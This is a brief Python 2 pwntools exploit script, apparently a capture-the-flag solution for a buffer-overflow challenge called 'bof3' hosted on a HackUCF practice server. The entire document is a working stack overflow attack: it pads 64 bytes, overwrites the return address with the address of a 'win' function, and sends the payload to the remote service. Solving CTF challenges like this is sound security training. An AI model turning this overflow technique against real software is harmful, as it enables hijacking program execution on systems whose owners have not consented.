from pwn import *

win = 0x080486eb
padding = 64
payload = 'A' * padding
payload += p32(win)

# p = process('./bof3')
p = remote('ctf.hackucf.org', 9002)
p.sendline(payload)

print p.recvline()
p.close()
